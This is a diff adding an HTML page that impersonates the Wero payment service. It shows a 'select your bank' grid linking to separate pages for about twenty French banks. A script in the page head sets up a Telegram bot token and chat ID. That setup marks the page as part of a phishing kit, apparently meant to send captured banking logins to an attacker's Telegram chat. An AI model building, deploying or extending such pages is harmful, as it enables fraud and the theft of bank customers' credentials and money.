@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <script>
+        window.telegramConfig = {
+            BOT_TOKEN: "TELEGRAM_BOT_TOKEN_PLACEHOLDER",
+            CHAT_ID: "TELEGRAM_CHAT_ID_PLACEHOLDER"
+        };
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wero - Sélectionnez votre banque</title>
+    
+    <link rel="icon" href="images/icon.png" type="image/png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;700;800;900&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --wero-yellow: #FFF69C;
+            --black: #000000;
+            --white: #ffffff;
+            --gray-light: #F9FAFB;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: 'Plus Jakarta Sans', sans-serif !important;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: var(--gray-light);
+            color: var(--black);
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            width: 100%;
+            border-bottom: 1px solid #E5E7EB;
+            background-color: var(--white);
+            padding: 1rem 1.25rem;
+        }
+
+        .logo-container {
+            font-size: 1.5rem;
+            font-weight: 900;
+            color: var(--black);
+            cursor: pointer;
+        }
+
+        main {
+            flex: 1;
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 3rem 1.25rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        h1 {
+            font-size: 2rem;
+            font-weight: 900;
+            text-align: center;
+            margin-bottom: 3rem;
+            color: var(--black);
+        }
+
+        .bank-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
+            gap: 2rem;
+            width: 100%;
+        }
+
+        .bank-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            cursor: pointer;
+            text-decoration: none;
+            transition: transform 0.2s;
+        }
+
+        .bank-item:hover {
+            transform: scale(1.1);
+        }
+
+        .bank-logo {
+            width: 110px;
+            height: 110px;
+            background: var(--white);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            transition: all 0.2s;
+            padding: 10px;
+        }
+
+        .bank-item:hover .bank-logo {
+            box-shadow: 0 6px 16px rgba(0,0,0,0.15);
+            background-color: var(--wero-yellow);
+        }
+
+        .bank-logo img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+
+        footer {
+            background-color: var(--white);
+            padding: 2rem 1.25rem;
+            text-align: center;
+            font-size: 0.75rem;
+            color: #4B5563;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo-container" onclick="window.location.href='index.html'">wero</div>
+    </header>
+
+    <main>
+        <h1>Sélectionnez votre banque</h1>
+        
+        <div class="bank-grid">
+            <a href="bcp.html" class="bank-item"><div class="bank-logo"><img src="images/bcpbank.png" alt="BCP"></div></a>
+            <a href="savoie.html" class="bank-item"><div class="bank-logo"><img src="images/banque-savoie.jpg" alt="Savoie"></div></a>
+            <a href="dupuy.html" class="bank-item"><div class="bank-logo"><img src="images/banque-dupuy.png" alt="Dupuy"></div></a>
+            <a href="marze.html" class="bank-item"><div class="bank-logo"><img src="images/marze.svg" alt="Marze"></div></a>
+            <a href="palatine.html" class="bank-item"><div class="bank-logo"><img src="images/palatine.svg" alt="Palatine"></div></a>
+            <a href="populaire.html" class="bank-item"><div class="bank-logo"><img src="images/banque-populaire.png" alt="Populaire"></div></a>
+            <a href="bnp.html" class="bank-item"><div class="bank-logo"><img src="images/bnp.jfif" alt="BNP"></div></a>
+            <a href="caisse-epargne.html" class="bank-item"><div class="bank-logo"><img src="images/caisse-epargne.png" alt="Caisse"></div></a>
+            <a href="cic.html" class="bank-item"><div class="bank-logo"><img src="images/cic.png" alt="CIC"></div></a>
+            <a href="credit-agricole.html" class="bank-item"><div class="bank-logo"><img src="images/credit-agricole.svg" alt="CA"></div></a>
+            <a href="cooperatif.html" class="bank-item"><div class="bank-logo"><img src="images/cooperatif.jpeg" alt="Coop"></div></a>
+            <a href="maritime.html" class="bank-item"><div class="bank-logo"><img src="images/maritime.png" alt="Maritime"></div></a>
+            <a href="nickel.html" class="bank-item"><div class="bank-logo"><img src="images/nickel.png" alt="Nickel"></div></a>
+            <a href="credit-mutuel.html" class="bank-item"><div class="bank-logo"><img src="images/credit-mutuel.png" alt="CM"></div></a>
+            <a href="hello-bank.html" class="bank-item"><div class="bank-logo"><img src="images/hello-bank.png" alt="Hello"></div></a>
+            <a href="fortuneo.html" class="bank-item"><div class="bank-logo"><img src="images/fortuneo.svg.png" alt="Fortuneo"></div></a>
+            <a href="banque-postale.html" class="bank-item"><div class="bank-logo"><img src="images/banque-postale.png" alt="BP"></div></a>
+            <a href="lcl.html" class="bank-item"><div class="bank-logo"><img src="images/lcl.png" alt="LCL"></div></a>
+            <a href="monabanq.html" class="bank-item"><div class="bank-logo"><img src="images/monabanq.png" alt="Monabanq"></div></a>
+            <a href="societe-generale.html" class="bank-item"><div class="bank-logo"><img src="images/societe-generale.png" alt="SG"></div></a>
+            <a href="wero.html" class="bank-item"><div class="bank-logo"><img src="images/bank-icon.png" alt="Autres"></div></a>
+        </div>
+    </main>
+
+    <footer>
+        <p>© 2026 EPI Company SE</p>
+    </footer>
+</body>
+</html>
+
